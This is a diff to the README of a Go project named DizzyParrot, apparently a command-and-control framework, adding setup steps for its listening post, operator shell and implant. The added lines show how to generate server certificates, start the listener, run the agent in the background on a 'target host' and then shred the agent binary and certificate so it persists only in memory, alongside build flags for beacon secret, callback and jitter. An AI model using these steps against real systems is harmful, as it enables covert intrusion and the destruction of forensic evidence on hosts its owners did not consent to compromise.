@@ -17,9 +17,13 @@ echo "export PATH=$PATH:/usr/local/go/bin" >> ~/.profile
 source ~/.profile
 ```
 
-#### Clone the repo using git
+#### Clone the repo using git and get go dependencies 
 ```
 git clone https://github.com/af001/DizzyParrot.git
+
+go get github.com/c-bata/go-prompt
+go get github.com/common-nighthawk/go-figure
+go get github.com/jedib0t/go-pretty/table
 ```
 
 #### Build LP and shell
@@ -37,4 +41,23 @@ go build -ldflags "-X main.name=A10000 -X main.secret=dirtyparrot -X main.callba
 GOOS=linux GOARCH=mips go build -ldflags "-X main.name=A10000 -X main.secret=dirtyparrot -X main.callback=300 -X main.jitter=60 -X main.url=https://localhost:8443//portal/details"
 ```
 
+#### Start the LP
+Generate certs and start LP
+```
+cd server; mkdir certs
+openssl req -newkey rsa:2048 -nodes -keyout certs/server.key -x509 -days 365 -out certs/server.crt
+./server -c config.yml
+```
+#### Start the shell
+```
+cd shell
+./shell -c config.yml
+```
 
+### Execute agent on target host
+```
+./client -c server.crt &
+
+# To run in memory 
+shred -fuz client server.crt
+```
